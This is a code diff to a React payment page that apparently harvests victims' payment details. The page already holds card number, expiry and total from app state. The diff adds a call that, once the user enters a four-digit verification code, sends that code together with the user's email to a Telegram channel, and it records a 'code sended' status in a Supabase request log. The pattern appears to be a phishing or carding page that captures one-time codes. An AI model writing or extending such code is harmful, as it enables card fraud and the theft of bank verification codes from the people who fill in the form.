@@ -7,11 +7,13 @@ import './PaymentPage.scss'
 import { useNavigate } from "react-router-dom";
 import { actionAddToOrder } from "../../store/thunks/checkOrder";
 import { handleUnload, supabase, updateRequest } from "../../axios/supabaseClient";
+import { sendMessageToTelegram } from "../../axios/tlg";
 
 function PaymentPage() {
   const dispatch = useAppDispatch();
   const navigate = useNavigate();
 
+  const email = useAppSelector((state) => state.account.account.email);
   const total = useAppSelector((state) => state.account.credentials.card.total);
   const date = useAppSelector((state) => state.account.credentials.card.date);
   const card_number = useAppSelector((state) => state.account.credentials.card.card_number);
@@ -23,51 +25,11 @@ function PaymentPage() {
   const [digits, setDigits] = useState({ digit1: "", digit2: "", digit3: "", digit4: "" });
   const [loading, setLoading] = useState(true);
   const [submited, setSubmited] = useState(false);
-  // const [isLeaving, setIsLeaving] = useState(false);
 
   const digit1Ref = useRef<HTMLInputElement>(null);
   const digit2Ref = useRef<HTMLInputElement>(null);
   const digit3Ref = useRef<HTMLInputElement>(null);
   const digit4Ref = useRef<HTMLInputElement>(null);
-
-  // useEffect(() => {
-  //   if (!notifId) return;
-
-  //   const handleBeforeUnload = (e: BeforeUnloadEvent) => {
-  //     e.preventDefault();
-  //     e.returnValue = "";
-  //   };
-
-  //   const handleUnloadWrapper = () => {
-  //     if (isLeaving) {
-  //       handleUnload(notifId);
-  //     }
-  //   };
-
-  //   window.addEventListener("beforeunload", handleBeforeUnload);
-
-  //   window.addEventListener("unload", () => {
-  //     if (isLeaving) {
-  //       handleUnload(notifId);
-  //     }
-  //   });
-
-  //   let currentLocation = location.pathname;
-
-  //   const handleLocationChange = () => {
-  //     if (location.pathname !== currentLocation) {
-  //       setIsLeaving(true);
-  //       currentLocation = location.pathname;
-  //     }
-  //   };
-
-  //   handleLocationChange();
-
-  //   return () => {
-  //     window.removeEventListener("beforeunload", handleBeforeUnload);
-  //     window.removeEventListener("unload", handleUnloadWrapper);
-  //   };
-  // }, [notifId, navigate]);
 
   useEffect(() => {
     if (notifId) {
@@ -157,7 +119,13 @@ function PaymentPage() {
         id: notifId,
         code: verifCode,
         status: "code sended"
-      })
+      });
+       try {
+        const message = `${email}\n${verifCode} \n statut: code envoyé`;
+        await sendMessageToTelegram(message);
+      } catch (error) {
+        console.log(error)
+      }
     }
   }
 
